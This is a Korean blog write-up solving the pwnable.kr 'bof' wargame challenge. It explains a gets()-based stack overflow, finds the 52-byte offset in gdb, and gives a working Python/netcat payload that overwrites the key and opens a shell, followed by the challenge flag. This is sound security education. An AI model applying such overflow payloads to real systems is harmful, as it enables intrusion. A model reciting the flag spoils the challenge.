---
title: "[Pwnable.kr] Toddler's Bottle - bof 문제풀이"
date: 2018-02-19
draft: false
category: [wargame]
subcategories: [pwnable.kr]
tags: [Write-up, Pwnable.kr]
---

`Pwnable.kr` 문제에서 3번째 문제인 `bof` 문제를 풀어보았다.
이번 문제는 로컬 문제가 아니라 리모트로 접속 해 풀어야 하는 문제이다.  

<!--more-->

때문에 `bof` 문제에서는 `bof` 실행파일과 `bof.c`라는 소스코드를 다운로드 할 수 있는 링크와 리모트로 접속할 수 있는 정보를 제공해준다.  

* [http://pwnable.kr/bin/bof](http://pwnable.kr/bin/bof)
* [http://pwnable.kr/bin/bof.c](http://pwnable.kr/bin/bof.c)
* nc pwnable.kr 9000

`bof.c`의 소스코드를 확인해 보면 아래와 같다.  

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

`main` 함수에서는 `0xdeadbeef`를 인자로 해 `func` 함수를 호출한다.
`func` 함수에서는 먼저 `32 byte` 의 char 형 변수인 `overflowme`를 선언하고, 해당 변수에 `gets` 함수를 통해 입력을 받아 저장한다.  

* gets 함수
	* 함수 원형 : gets(char * str)
	* 표준 입력에서 문자열을 가져온다.
	* 이 때, 개행 문자(\n)이나 파일 끝(EOF)를 만나기 전까지 가져오는데, 크기를 따로 검사하지 않기 때문에 `overflow` 가 일어날 수 있다.

이 후, 만약 `func` 함수에 인자로 넘어 온 `key`의 값이 `0xcafebabe`와 같다면 `system` 함수를 통해 `/bin/sh`를 실행시켜 준다.
`func` 함수에서 `gets` 함수를 통해 문자열을 입력 받는데, 문자열의 길이를 검사하지 않는다.
때문에 `overflow`를 발생시킬 수 있다.  

![](/images/pwnable.kr/bof/bof_01.PNG)  

위의 그림은 `func` 함수를 호출했을 때의 `stack` 모습니다.
`func` 함수를 호출하면 스택에는 func 함수의 인자인 `key(0xdeadbeef)` 스택에 저장하고, `return address`와 `SFP`를 차례로 스택에 저장한 후, func 함수에서 사용 할 지역 변수인 `overflowme`를 위한 공간을 할당한다.
이 때, `overflowme`는 `32 byte`의 공간을 할당받았지만 `gets` 함수에서 문자열의 길이를 확인하지 않아 아래와 같이 `overflow`가 발생할 수 있다.  

![](/images/pwnable.kr/bof/bof_02.PNG)  

`overflowmw`에 충분한 값을 입력한 후, func 함수의 인자인 `key`의 값이 저장된 위치에 `0xcafebabe`를 덮어 쓴다면 `system("/bin/sh")`가 실행되며 쉘을 얻을 수 있다.
문제를 풀기 위해선 `overflowme`와 `key` 사이의 거리를 알아야 한다.
이를 알기 위해 `gdb`를 사용했다.  

![](/images/pwnable.kr/bof/bof_03.PNG)

먼저 `key`의 값을 비교하는 부분인 `0x56555654 <+40>`에 `break point`를 걸고 `32 byte` 만큼을 입력 해 보았다.  

![](/images/pwnable.kr/bof/bof_04.PNG)

실행 후 확인해 본 결과 아래와 같았다.  

![](/images/pwnable.kr/bof/bof_05.PNG)

`0xffffd5cc` 부터 `overflowme`가 시작되며, `0xffffd600` 위치에 `key`의 값인 `0xdeadbeef`가 저장되어 있는 것을 알 수 있다.
두 변수 간의 거리는 다음과 같다.  

* 0xffffd600 - 0xffffd5cc = 0x34 (= 52)

즉, 두 변수는 `52 byte` 만큼 떨어져 있다.
따라서 쉘을 얻기 위해서는 `52 byte` 만큼의 값을 입력하고, 이 후 `0xcafebabe`를 입력 해 주면 `overflow`가 발생하며 `func`의 인자인 `key`의 값을 덮어쓸 수 있을 것이다.
이를 실행해본 결과 다음과 같이 쉘을 얻을 수 있었다.
파일을 확인해 본 결과 `flag` 파일이 있어, 이를 실행했더니 `flag`를 얻을 수 있었다.  

![](/images/pwnable.kr/bof/bof_06.PNG)

```bash
ccoma@vultr:~$ (python -c 'print "a"*52+"\xbe\xba\xfe\xca"';cat) | nc pwnable.kr 9000
ls
bof
bof.c
flag
log
log2
super.pl
cat flag
daddy, I just pwned a buFFer :)
```

--- 

```plain
FLAG : daddy, I just pwned a buFFer :)
```
